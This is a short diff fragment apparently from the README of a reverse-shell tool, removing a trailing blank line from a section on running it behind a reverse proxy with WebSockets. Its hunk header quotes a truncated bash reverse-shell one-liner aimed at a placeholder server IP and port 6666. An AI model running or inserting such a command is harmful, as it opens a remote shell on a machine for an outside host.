@@ -60,4 +60,3 @@ sh -i >& /dev/tcp/YOUR_SERVER_IP/6666 0>&
 ## Behind a reverse proxy
 
 Steps are basically the same, you just need to enable WebSockets for HTTP.
-
